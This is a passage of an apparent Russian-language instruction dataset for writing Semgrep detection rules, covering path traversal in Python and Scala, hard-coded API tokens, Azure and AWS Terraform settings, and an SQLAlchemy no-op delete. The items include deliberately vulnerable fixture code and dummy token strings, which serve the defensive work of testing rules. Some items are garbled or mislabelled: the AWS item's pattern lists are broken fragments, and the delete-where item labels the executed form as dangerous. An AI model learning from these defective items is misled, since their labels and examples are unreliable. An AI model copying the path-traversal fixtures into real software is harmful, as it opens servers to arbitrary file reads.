...)\n    - pattern: $A = open(..., $S.format(..., request.$W.get(...), ...), ...)\n    - pattern: $A = open(..., $S % request.$W.get(...), ...)\n    - pattern: $A = open(..., f\"...{request.$W.get(...)}...\", ...)\n    - pattern: return open(..., request.$W.get(...), ...)\n    - pattern: return open(..., $S.format(..., request.$W.get(...), ...), ...)\n    - pattern: return open(..., $S % request.$W.get(...), ...)\n    - pattern: return open(..., f\"...{request.$W.get(...)}...\", ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        with open(..., $DATA, ...) as $FD:\n          ...\n    - pattern: open(..., request.$W(...), ...)\n    - pattern: open(..., $S.format(..., request.$W(...), ...), ...)\n    - pattern: open(..., $S % request.$W(...), ...)\n    - pattern: open(..., f\"...{request.$W(...)}...\", ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        open(..., $DATA, ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $INTERM = $DATA\n        ...\n        open(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $INTERM = $DATA\n        ...\n        with open(..., $INTERM, ...) as $FD:\n          ...\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        open(..., $STR.format(..., $DATA, ...), ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $INTERM = $STR.format(..., $DATA, ...)\n        ...\n        open(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $INTERM = $STR.format(..., $DATA, ...)\n        ...\n        with open(..., $INTERM, ...) as $FD:\n          ...\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        open(..., $STR % $DATA, ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $INTERM = $STR % $DATA\n        ...\n        open(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $INTERM = $STR % $DATA\n        ...\n        with open(..., $INTERM, ...) as $FD:\n          ...\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        open(..., f\"...{$DATA}...\", ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $INTERM = f\"...{$DATA}...\"\n        ...\n        open(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $INTERM = f\"...{$DATA}...\"\n        ...\n        with open(..., $INTERM, ...) as $FD:\n          ...\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        open(..., $STR + $DATA, ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $INTERM = $STR + $DATA\n        ...\n        open(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $INTERM = $STR + $DATA\n        ...\n        with open(..., $INTERM, ...) as $FD:\n          ...\n    - pattern: $A = open(..., request.$W(...), ...)\n    - pattern: $A = open(..., $S.format(..., request.$W(...), ...), ...)\n    - pattern: $A = open(..., $S % request.$W(...), ...)\n    - pattern: $A = open(..., f\"...{request.$W(...)}...\", ...)\n    - pattern: return open(..., request.$W(...), ...)\n    - pattern: return open(..., $S.format(..., request.$W(...), ...), ...)\n    - pattern: return open(..., $S % request.$W(...), ...)\n    - pattern: return open(..., f\"...{request.$W(...)}...\", ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        with open(..., $DATA, ...) as $FD:\n          ...\n    - pattern: open(..., request.$W[...], ...)\n    - pattern: open(..., $S.format(..., request.$W[...], ...), ...)\n    - pattern: open(..., $S % request.$W[...], ...)\n    - pattern: open(..., f\"...{request.$W[...]}...\", ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        open(..., $DATA, ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $INTERM = $DATA\n        ...\n        open(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $INTERM = $DATA\n        ...\n        with open(..., $INTERM, ...) as $FD:\n          ...\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        open(..., $STR.format(..., $DATA, ...), ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $INTERM = $STR.format(..., $DATA, ...)\n        ...\n        open(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $INTERM = $STR.format(..., $DATA, ...)\n        ...\n        with open(..., $INTERM, ...) as $FD:\n          ...\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        open(..., $STR % $DATA, ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $INTERM = $STR % $DATA\n        ...\n        open(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $INTERM = $STR % $DATA\n        ...\n        with open(..., $INTERM, ...) as $FD:\n          ...\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        open(..., f\"...{$DATA}...\", ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $INTERM = f\"...{$DATA}...\"\n        ...\n        open(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $INTERM = f\"...{$DATA}...\"\n        ...\n        with open(..., $INTERM, ...) as $FD:\n          ...\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        open(..., $STR + $DATA, ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $INTERM = $STR + $DATA\n        ...\n        open(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $INTERM = $STR + $DATA\n        ...\n        with open(..., $INTERM, ...) as $FD:\n          ...\n    - pattern: $A = open(..., request.$W[...], ...)\n    - pattern: $A = open(..., $S.format(..., request.$W[...], ...), ...)\n    - pattern: $A = open(..., $S % request.$W[...], ...)\n    - pattern: $A = open(..., f\"...{request.$W[...]}...\", ...)\n    - pattern: return open(..., request.$W[...], ...)\n    - pattern: return open(..., $S.format(..., request.$W[...], ...), ...)\n    - pattern: return open(..., $S % request.$W[...], ...)\n    - pattern: return open(..., f\"...{request.$W[...]}...\", ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        with open(..., $DATA, ...) as $FD:\n          ...\n    - pattern: open(..., request.$W, ...)\n    - pattern: open(..., $S.format(..., request.$W, ...), ...)\n    - pattern: open(..., $S % request.$W, ...)\n    - pattern: open(..., f\"...{request.$W}...\", ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        open(..., $DATA, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $INTERM = $DATA\n        ...\n        open(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $INTERM = $DATA\n        ...\n        with open(..., $INTERM, ...) as $FD:\n          ...\n    - pattern: |\n        $DATA = request.$W\n        ...\n        open(..., $STR.format(..., $DATA, ...), ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $INTERM = $STR.format(..., $DATA, ...)\n        ...\n        open(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $INTERM = $STR.format(..., $DATA, ...)\n        ...\n        with open(..., $INTERM, ...) as $FD:\n          ...\n    - pattern: |\n        $DATA = request.$W\n        ...\n        open(..., $STR % $DATA, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $INTERM = $STR % $DATA\n        ...\n        open(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $INTERM = $STR % $DATA\n        ...\n        with open(..., $INTERM, ...) as $FD:\n          ...\n    - pattern: |\n        $DATA = request.$W\n        ...\n        open(..., f\"...{$DATA}...\", ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $INTERM = f\"...{$DATA}...\"\n        ...\n        open(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $INTERM = f\"...{$DATA}...\"\n        ...\n        with open(..., $INTERM, ...) as $FD:\n          ...\n    - pattern: |\n        $DATA = request.$W\n        ...\n        open(..., $STR + $DATA, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $INTERM = $STR + $DATA\n        ...\n        open(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $INTERM = $STR + $DATA\n        ...\n        with open(..., $INTERM, ...) as $FD:\n          ...\n    - pattern: $A = open(..., request.$W, ...)\n    - pattern: $A = open(..., $S.format(..., request.$W, ...), ...)\n    - pattern: $A = open(..., $S % request.$W, ...)\n    - pattern: $A = open(..., f\"...{request.$W}...\", ...)\n    - pattern: return open(..., request.$W, ...)\n    - pattern: return open(..., $S.format(..., request.$W, ...), ...)\n    - pattern: return open(..., $S % request.$W, ...)\n    - pattern: return open(..., f\"...{request.$W}...\", ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        with open(..., $DATA, ...) as $FD:\n          ...\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования функции 'open' в Python с передачей аргументов, полученных от HTTP-запроса через объект 'request', без предварительной проверки или санитаризации этих данных. Это может привести к атакам типа path traversal, когда злоумышленник сможет получить доступ к произвольным файлам на сервере. Правило использует шаблоны, которые соответствуют различным способам передачи необработанных данных запроса в функцию 'open', включая использование строковых форматов ($S) и форматирования строк (f-string). Шаблоны также учитывают возможность вызова функции 'open' внутри блока 'with', а также случаи, когда результат передается переменной и затем используется.\n\n# Ключевые элементы:\n- ID: path-traversal-open\n- Язык: python \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "path-traversal-open",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения: dynatrace-api-token\nОписание уязвимости: A gitleaks dynatrace-api-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: INFO\n\nКонтекст кода:\n// File: dynatrace-api-token.go\n// ruleid: dynatrace-api-token\ndynatrace_api_token = \"dt0c01.6rm7jcwbb3fmtfzkyepf16kj.3l8arrff1ozxlllxrzel9usoanieedfliwwnmuq5z6vbhogdykznemtv2k7y270q\"  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: dynatrace-api-token.go\n// ruleid: dynatrace-api-token\ndynatrace_api_token = \"dt0c01.6rm7jcwbb3fmtfzkyepf16kj.3l8arrff1ozxlllxrzel9usoanieedfliwwnmuq5z6vbhogdykznemtv2k7y270q\"\n• // File: another-dynatrace-go-file.go\n// ruleid: dynatrace-api-token\ndynatrace_api_key = \"dt0c01.xyzabc123defghijklmnopqrstuvwxyz1234567890abcdefg\"\n\nБезопасные паттерны:  \n• // File: safe-dynatrace-go-file.go\nglobalDynatraceApiToken := os.Getenv(\"DYNA_TRACE_API_TOKEN\")\n• // File: secure-dynatrace-go-file.go\nvar dynatraceApiKey string = getSecureTokenFromVault()\n\nЛегенда аннотаций:\n- // ruleid:dynatrace-api-token: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:dynatrace-api-token: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: dynatrace-api-token\n  message: A gitleaks dynatrace-api-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\n  languages:\n    - regex\n  severity: INFO\n  metadata:\n      likelihood: LOW\n      impact: MEDIUM\n      confidence: LOW\n      category: security\n      cwe:\n        - \"CWE-798: Use of Hard-coded Credentials\"\n      cwe2021-top25: true\n      cwe2022-top25: true\n      owasp:\n        - A07:2021 - Identification and Authentication Failures\n      references:\n        - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n      source-rule-url: https://github.com/zricethezav/gitleaks/tree/master/cmd/generate/config/rules\n      subcategory:\n        - vuln\n      technology:\n        - gitleaks\n  patterns:\n    - pattern-regex: dt0c01\\.(?i)[a-z0-9]{24}\\.[a-z0-9]{64}\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска жестко закодированного токена Dynatrace API в исходном коде. Паттерн ищет строку, начинающуюся с 'dt0c01.', за которой следует 24 символа в нижнем регистре и цифрах, затем точка и далее 64 символа в нижнем регистре и цифрах. Это соответствует формату токенов Dynatrace API. Правило применяет поисковый тип анализа и использует регулярные выражения для точного сопоставления токенов.\n\n# Ключевые элементы:\n- ID: dynatrace-api-token\n- Язык: regex \n- Тип: vuln\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "dynatrace-api-token",
      "language": "regex",
      "severity": "INFO",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: azure-sqlserver-email-alerts-toadmins-enabled\nОписание уязвимости: Ensure that Email service and co-administrators is Enabled for MSSQL servers\nCWE: \nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: azure-sqlserver-email-alerts-toadmins-enabled.tf\n# fail\n# ruleid: azure-sqlserver-email-alerts-toadmins-enabled\nresource \"azurerm_mssql_server_security_alert_policy\" \"example\" {\n    resource_group_name        = azurerm_resource_group.example.name\n    server_name                = azurerm_sql_server.example.name\n    state                      = \"Enabled\"\n    storage_endpoint           = azurerm_storage_account.example.primary_blob_endpoint\n    storage_account_access_key = azurerm_storage_account.example.primary_access_key\n    disabled_alerts = [\n    \"Sql_Injection\",\n    \"Data_Exfiltration\"\n    ]\n    retention_days = 20\n}\n\n# pass\nresource \"azurerm_mssql_server_security_alert_policy\" \"example\" {\n    resource_group_name        = azurerm_resource_group.example.name\n    server_name                = azurerm_sql_server.example.name\n    state                      = \"Enabled\"\n    storage_endpoint           = azurerm_storage_account.example.primary_blob_endpoint\n    storage_account_access_key = azurerm_storage_account.example.primary_access_key\n    disabled_alerts = []\n    email_addresses = [\"example@gmail.com\"]\n    email_account_admins = true\n    retention_days = 20\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"azurerm_mssql_server_security_alert_policy\" \"example\" { ... state = \"Enabled\" ... }\n• resource \"azurerm_mssql_server_security_alert_policy\" \"example\" { ... state = \"Enabled\" disabled_alerts = [...] ... }\n\nБезопасные паттерны:  \n• resource \"azurerm_mssql_server_security_alert_policy\" \"example\" { ... state = \"Enabled\" email_account_admins = true ... }\n• resource \"azurerm_mssql_server_security_alert_policy\" \"example\" { ... state = \"Enabled\" email_addresses = [...] ... }\n\nЛегенда аннотаций:\n- // ruleid:azure-sqlserver-email-alerts-toadmins-enabled: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:azure-sqlserver-email-alerts-toadmins-enabled: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: azure-sqlserver-email-alerts-toadmins-enabled\n    message: >-\n      Ensure that Email service and co-administrators is Enabled for MSSQL servers\n    patterns:\n      - pattern: resource\n      - pattern-inside: |\n          resource \"azurerm_mssql_server_security_alert_policy\" \"...\" {\n          ...\n          }\n      - pattern-not-inside: |\n          resource \"azurerm_mssql_server_security_alert_policy\" \"...\" {\n          ...\n          state = \"Enabled\"\n          email_account_admins = true\n          ...\n          }\n    metadata:\n      category: best-practice\n      technology:\n        - terraform\n        - azure\n    languages: [hcl]\n    severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска конфигураций Azure SQL Server, где политика уведомлений о безопасности не включает опцию 'email_account_admins'. Правило выполняет поиск ресурсов типа 'azurerm_mssql_server_security_alert_policy' и проверяет наличие ключевого слова 'state = \"Enabled\"', при этом исключая случаи, когда также присутствует 'email_account_admins = true'. Это позволяет обнаружить конфигурации, которые потенциально оставляют администраторов сервера вне уведомления об инцидентах.\n\n# Ключевые элементы:\n- ID: azure-sqlserver-email-alerts-toadmins-enabled\n- Язык: hcl \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "azure-sqlserver-email-alerts-toadmins-enabled",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Разработай правило Semgrep для выявления: readme-api-token\nОписание уязвимости: A gitleaks readme-api-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: INFO\n\nКонтекст кода:\n// File: readme-api-token.go\n// ruleid: readme-api-token\napi-token_api_token = \"rdme_68th6k06fl12xc2bg7vkk8592sj8m563exdewbn7zu9tcsoy2zaulae78hs0jrxxuexk4z\"  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: readme-api-token.go\n// ruleid: readme-api-token\napi-token_api_token = \"rdme_68th6k06fl12xc2bg7vkk8592sj8m563exdewbn7zu9tcsoy2zaulae78hs0jrxxuexk4z\"\n\n• // File: another-readme-go\n// ruleid: readme-api-token\nreadme_api_token = \"rdme_a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6\"\n\n\nБезопасные паттерны:  \n• // File: safe-readme-go\n// safeid: readme-api-token\nconst apiToken = getApiTokenFromSecureVault()\n\n• // File: secure-readme-go\n// safeid: readme-api-token\nvar apiToken string = os.Getenv(\"API_TOKEN\")\n\n\nЛегенда аннотаций:\n- // ruleid:readme-api-token: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:readme-api-token: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: readme-api-token\n  message: A gitleaks readme-api-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\n  languages:\n    - regex\n  severity: INFO\n  metadata:\n      likelihood: LOW\n      impact: MEDIUM\n      confidence: LOW\n      category: security\n      cwe:\n        - \"CWE-798: Use of Hard-coded Credentials\"\n      cwe2021-top25: true\n      cwe2022-top25: true\n      owasp:\n        - A07:2021 - Identification and Authentication Failures\n      references:\n        - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n      source-rule-url: https://github.com/zricethezav/gitleaks/tree/master/cmd/generate/config/rules\n      subcategory:\n        - vuln\n      technology:\n        - gitleaks\n  patterns:\n    - pattern-regex: (?i)\\b(rdme_[a-z0-9]{70})(?:['|\\\"|\\n|\\r|\\s|\\x60|;]|$)\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска жестко закодированных токенов API в файле readme-api-token.go. Регулярное выражение ищет строку, начинающуюся с 'rdme_' и продолжающуюся 70 символами алфавитно-цифровых символов, за которыми следует пробел или конец строки. Это соответствует формату токена API GitLab Readme. Правило применимо только к языку regex.\n\n# Ключевые элементы:\n- ID: readme-api-token\n- Язык: regex \n- Тип: vuln\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "readme-api-token",
      "language": "regex",
      "severity": "INFO",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: delete-where-no-execute\nОписание уязвимости: .delete().where(...) results in a no-op in SQLAlchemy unless the command is executed, use .filter(...).delete() instead.\nCWE: \nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: \n- Серьезность: ERROR\n\nКонтекст кода:\n// File: delete-where.py\ndelete = table.delete().where(table.post_id == post_id).execute()\n# ruleid:delete-where-no-execute\ndelete = table.delete().where(table.post_id == post_id)  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: delete-where.py\ndelete = table.delete().where(table.post_id == post_id).execute()\n• // File: another_delete.py\nquery = session.query(Table).filter(Table.id == 1).delete().where(Table.name == 'test')\n\nБезопасные паттерны:  \n• // File: safe_delete.py\ndelete = table.delete().where(table.post_id == post_id).execute()\nsession.commit()\n• // File: correct_delete.py\nquery = session.query(Table).filter(Table.id == 1).delete().execute()\n\nЛегенда аннотаций:\n- // ruleid:delete-where-no-execute: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:delete-where-no-execute: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: delete-where-no-execute\n    patterns:\n      - pattern: $X.delete().where(...)\n      - pattern-not-inside: $X.delete().where(...).execute()\n      - pattern-not-inside: $C.execute(...)\n    message:\n      .delete().where(...) results in a no-op in SQLAlchemy unless the command is executed, use .filter(...).delete()\n      instead.\n    languages: [python]\n    severity: ERROR\n    metadata:\n      category: correctness\n      technology:\n        - sqlalchemy\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска потенциальных проблем безопасности, связанных с использованием метода .delete() в SQLAlchemy. Правило ищет случаи, когда метод .delete() используется вместе с методом .where(), но отсутствует вызов метода .execute(). Это может привести к тому, что удаление не будет выполнено, так как SQLAlchemy требует явного вызова .execute() для выполнения команды удаления. Правило использует шаблон, который сначала ищет вызов метода .delete() с последующим вызовом .where(), затем проверяет, что этот блок не содержится внутри вызова .execute() или другого вызова функции execute.\n\n# Ключевые элементы:\n- ID: delete-where-no-execute\n- Язык: python \n- Тип: \n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "delete-where-no-execute",
      "language": "python",
      "severity": "ERROR",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: path-traversal-fromfile\nОписание уязвимости: Flags cases of possible path traversal. If an unfiltered parameter is passed into 'fromFile', file from an arbitrary filesystem location could be read. This could lead to sensitive data exposure and other provles. Instead, sanitize the user input instead of performing direct string concatenation.\nCWE: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\nТип анализа: search\nЯзык: scala",
    "input": "Требования:\n- Язык: scala\n- Тип анализа: search\n- CWE: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: path-traversal-fromfile.scala\nclass Test {\n  def bad1(value:String) = Action {\n    if (!Files.exists(Paths.get(\"public/lists/\" + value))) {\n      NotFound(\"File not found\")\n    } else {\n      // ruleid: path-traversal-fromfile\n      val result = Source.fromFile(\"public/lists/\" + value).getLines().mkString // Weak point\n      Ok(result)\n    }\n  }\n\n  def bad2(value:String) = Action {\n    if (!Files.exists(Paths.get(\"public/lists/\" + value))) {\n      NotFound(\"File not found\")\n    } else {\n      val filename1 = \"public/lists\"\n      val filename = filename1 + value\n      // ruleid: path-traversal-fromfile\n      val result = Source.fromFile(filename).getLines().mkString // Weak point\n      Ok(result)\n    }\n  }\n\n  def bad3(value:String) = Action {\n    if (!Files.exists(Paths.get(\"public/lists/\" + value))) {\n      NotFound(\"File not found\")\n    } else {\n      // ruleid: path-traversal-fromfile\n      val result = Source.fromFile(\"%s/%s\".format(\"public/lists\", value)).getLines().mkString // Weak point\n      Ok(result)\n    }\n  }\n\n  def bad4(value:String) = Action {\n    if (!Files.exists(Paths.get(\"public/lists/\" + value))) {\n      NotFound(\"File not found\")\n    } else {\n      var filename1 = \"public/lists/\"\n      val filename = filename1.concat(value)\n      // ruleid: path-traversal-fromfile\n      val result = Source.fromFile(filename).getLines().mkString // Weak point\n      Ok(result)\n    }\n  }\n\n  def ok(value:String) = Action {\n    val filename = \"public/lists/\" + FilenameUtils.getName(value)\n\n    if (!Files.exists(Paths.get(filename))) {\n      NotFound(\"File not found\")\n    } else {\n      // ok: path-traversal-fromfile\n      val result = Source.fromFile(filename).getLines().mkString // Fix\n      Ok(result)\n    }\n  }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• val result = Source.fromFile(\"public/lists/\" + value).getLines().mkString\n• val filename1 = \"public/lists\"\nval filename = filename1 + value\nval result = Source.fromFile(filename).getLines().mkString\n• val result = Source.fromFile(\"%s/%s\".format(\"public/lists\", value)).getLines().mkString\n\nБезопасные паттерны:  \n• val filename = \"public/lists/\" + FilenameUtils.getName(value)\n• def func(..., var: String, ...) = Action {\n  val filename = \"public/lists/\" + var\n  ...\n}\n• val result = Source.fromFile(\"fixed/file/path\").getLines().mkString\n\nЛегенда аннотаций:\n- // ruleid:path-traversal-fromfile: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:path-traversal-fromfile: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: path-traversal-fromfile\n  metadata:\n    cwe:\n    - \"CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\"\n    owasp:\n    - A05:2017 - Broken Access Control\n    - A01:2021 - Broken Access Control\n    category: security\n    technology:\n    - scala\n    resources:\n    - https://find-sec-bugs.github.io/bugs.htm\n    confidence: LOW\n    references:\n    - https://owasp.org/Top10/A01_2021-Broken_Access_Control\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n  message: >-\n    Flags cases of possible path traversal. If an unfiltered parameter is passed into 'fromFile', file\n    from an arbitrary filesystem\n    location could be read. This could lead to sensitive data exposure and other provles. Instead, sanitize\n    the user input\n    instead of performing direct string concatenation.\n  severity: WARNING\n  languages:\n  - scala\n  patterns:\n  - pattern-either:\n    - patterns:\n      - pattern-either:\n        - pattern-inside: |\n            $FILENAME = \"...\" + $VAR\n            ...\n        - pattern-inside: |\n            $FILENAME = $VAR + \"...\"\n            ...\n        - pattern-inside: |\n            $FILENAME = $STR.concat($VAR)\n            ...\n        - pattern-inside: |\n            $FILENAME = \"...\".format(..., $VAR, ...)\n            ...\n      - pattern: Source.fromFile($FILENAME, ...)\n    - patterns:\n      - pattern-either:\n        - pattern: Source.fromFile(\"...\" + $VAR, ...)\n        - pattern: Source.fromFile($VAR + \"...\", ...)\n        - pattern: Source.fromFile($STR.concat($VAR), ...)\n        - pattern: Source.fromFile(\"...\".format(..., $VAR, ...), ...)\n  - pattern-inside: |\n      def $FUNC(..., $VAR: $TYPE, ...) = Action {\n        ...\n      }\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска возможных случаев обхода пути (path traversal) при использовании метода 'Source.fromFile' в Scala. Паттерн ищет конструкции, где имя файла формируется путем конкатенации строк или форматирования строк с использованием переменной, переданной пользователем. Это может позволить злоумышленнику читать файлы из произвольных путей файловой системы, что представляет угрозу безопасности, такую как утечка конфиденциальной информации.\n\n# Ключевые элементы:\n- ID: path-traversal-fromfile\n- Язык: scala \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "path-traversal-fromfile",
      "language": "scala",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: aws-ecr-image-scanning-disabled\nОписание уязвимости: The ECR repository has image scans disabled. Repository image scans should be enabled to ensure vulnerable software can be discovered and remediated as soon as possible.\nCWE: CWE-223: Omission of Security-relevant Information\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-223: Omission of Security-relevant Information\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: aws-ecr-image-scanning-disabled.tf\n# ruleid: aws-ecr-image-scanning-disabled\nresource \"aws_ecr_repository\" \"fail_1\" {\n  name = \"example\"\n}\n\n# ruleid: aws-ecr-image-scanning-disabled\nresource \"aws_ecr_repository\" \"fail_2\" {\n  name = \"example\"\n\n  image_scanning_configuration {\n    scan_on_push = false\n  }\n}\n\n# ok: aws-ecr-image-scanning-disabled\nresource \"aws_ecr_repository\" \"pass\" {\n  name = \"example\"\n\n  image_scanning_configuration {\n    scan_on_push = true\n  }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \\\n•  \\\n•  { \\n  name = \\\n\nБезопасные паттерны:  \n• resource \\\n•  \\\n•  { \\n  name = \\\n\nЛегенда аннотаций:\n- // ruleid:aws-ecr-image-scanning-disabled: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:aws-ecr-image-scanning-disabled: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: aws-ecr-image-scanning-disabled\n  patterns:\n  - pattern: |\n      resource \"aws_ecr_repository\" $ANYTHING {\n        ...\n      }\n  - pattern-not-inside: |\n      resource \"aws_ecr_repository\" $ANYTHING {\n        ...\n        image_scanning_configuration {\n          ...\n          scan_on_push = true\n          ...\n        }\n        ...\n      }\n  message: >-\n    The ECR repository has image scans disabled. Repository image scans should\n    be enabled to ensure vulnerable software can be discovered and remediated as soon\n    as possible.\n  languages:\n  - hcl\n  severity: WARNING\n  metadata:\n    references:\n    - https://docs.aws.amazon.com/AmazonECR/latest/userguide/image-scanning.html\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ecr_repository#image_scanning_configuration\n    - https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/\n    category: security\n    technology:\n    - terraform\n    - aws\n    owasp:\n    - A09:2021 - Security Logging and Monitoring Failures\n    cwe:\n    - 'CWE-223: Omission of Security-relevant Information'\n    subcategory:\n    - audit\n    likelihood: MEDIUM\n    